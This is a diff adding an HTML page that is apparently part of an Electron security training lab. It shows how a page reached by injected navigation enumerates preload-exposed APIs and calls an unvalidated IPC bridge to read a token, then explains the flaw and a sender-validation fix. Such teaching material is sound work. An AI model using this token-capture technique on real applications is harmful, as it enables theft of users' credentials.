@@ -1,0 +1,100 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Attacker Page – Token Capture</title>
+    <link rel="stylesheet" href="../styles/style.css" />
+  </head>
+  <body>
+    <h1 style="color: #e53e3e">Attacker-Controlled Page</h1>
+    <section class="panel">
+      <div class="panel-body">
+        <p>
+          The analytics window navigated here via the <code>&lt;meta http-equiv="refresh"&gt;</code>
+          payload injected into the display name. This page is outside the app — but the
+          <code>analyticsAPI</code> IPC bridge from the preload script is still available because
+          the preload is bound to the <strong>window</strong>, not the URL.
+        </p>
+      </div>
+
+      <div class="panel-header">
+        <h2>Step 1 — Enumerate exposed APIs</h2>
+      </div>
+      <div class="panel-body">
+        <p>
+          Start by discovering what the preload added to <code>window</code>.
+          <code>contextBridge.exposeInMainWorld(name, obj)</code> sets
+          <code>window[name]</code>, so it appears alongside every standard browser global.
+        </p>
+        <pre><code>Object.keys(window).filter(k => typeof window[k] === 'object' && window[k] !== null)</code></pre>
+        <b>Non-standard window objects found:</b>
+        <div id="windowScanOutput" class="xss-output">Scanning…</div>
+
+        <p style="margin-top: 12px">
+          Now enumerate the methods on each discovered API:
+        </p>
+        <pre><code>Object.keys(window.analyticsAPI)</code></pre>
+        <b>Methods available:</b>
+        <div id="enumOutput" class="xss-output">Enumerating…</div>
+      </div>
+
+      <div class="panel-header">
+        <h2>Step 2 — Call the unvalidated bridge</h2>
+      </div>
+      <div class="panel-body">
+        <p>
+          The main process <code>get-token</code> handler performs no sender validation. Any page
+          loaded in this window — regardless of origin — can invoke it:
+        </p>
+        <pre><code>await window.analyticsAPI.getToken()</code></pre>
+        <div id="tokenOutput" class="xss-output">Waiting…</div>
+      </div>
+
+      <div class="xss-explanation">
+        <strong>Why this works:</strong> Electron preload scripts execute for every navigation
+        within a webContents. The main process <code>get-token</code> handler never checks
+        <code>event.senderFrame.url</code> or validates the sender's origin against an allowlist.
+        <br /><br />
+        <strong>Fix:</strong> Validate the sender in the IPC handler:
+        <code>if (!event.senderFrame.url.startsWith('file:///.../analytics.html')) return;</code>
+        Or apply a capability-based model — expose only what each page strictly needs, and never
+        expose privileged bridges to windows that may navigate to untrusted content.
+      </div>
+    </section>
+    <script>
+      (async () => {
+        const windowScanEl = document.getElementById('windowScanOutput');
+        const enumEl = document.getElementById('enumOutput');
+        const tokenEl = document.getElementById('tokenOutput');
+
+        // Step 1a: find non-standard object-type properties on window
+        try {
+          const knownGlobals = new Set(Object.getOwnPropertyNames(Window.prototype));
+          const custom = Object.keys(window).filter(
+            k => !knownGlobals.has(k) && typeof window[k] === 'object' && window[k] !== null
+          );
+          windowScanEl.textContent = custom.length
+            ? custom.join(', ')
+            : '(none found)';
+        } catch (err) {
+          windowScanEl.textContent = 'Error: ' + err.message;
+        }
+
+        // Step 1b: enumerate methods on the discovered API
+        try {
+          const keys = Object.keys(window.analyticsAPI);
+          enumEl.textContent = '["' + keys.join('", "') + '"]';
+        } catch (err) {
+          enumEl.textContent = 'Error: ' + err.message;
+        }
+
+        // Step 2: call the unvalidated bridge
+        try {
+          const token = await window.analyticsAPI.getToken();
+          tokenEl.textContent = token;
+        } catch (err) {
+          tokenEl.textContent = 'Error: ' + err.message;
+        }
+      })();
+    </script>
+  </body>
+</html>
